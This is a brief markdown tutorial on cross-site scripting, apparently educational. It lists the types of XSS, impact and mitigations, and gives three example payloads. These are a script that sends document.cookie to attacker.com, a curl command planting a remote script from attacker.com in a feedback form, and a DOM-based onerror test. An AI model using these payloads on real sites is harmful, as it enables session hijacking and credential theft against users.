# ⚠️ Cross-Site Scripting (XSS) – Advanced Analysis

## Overview
Cross-Site Scripting (XSS) is a client-side vulnerability that allows attackers to inject malicious JavaScript into trusted web pages.

---

## Types of XSS
- Reflected XSS
- Stored XSS
- DOM-Based XSS

---

## Advanced Exploitation Examples

### 1️⃣ Cookie Stealing Payload
```html
<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
```

### 2️⃣ Blind XSS Injection (Bash)
```bash
curl -X POST http://target.com/feedback -d "msg=<script src='http://attacker.com/x.js'></script>"
```
**Explanation:** Payload executes later in an admin panel.

---

### 3️⃣ DOM-Based XSS Test
```bash
curl "http://target.com/#<img src=x onerror=alert('XSS')>"
```

---

## Impact
- Session hijacking
- Credential theft
- Browser exploitation

---

## Mitigation
- Output encoding
- Content Security Policy (CSP)
- Input validation

---

## Conclusion
Advanced XSS attacks can fully compromise user sessions and trust boundaries if not mitigated.
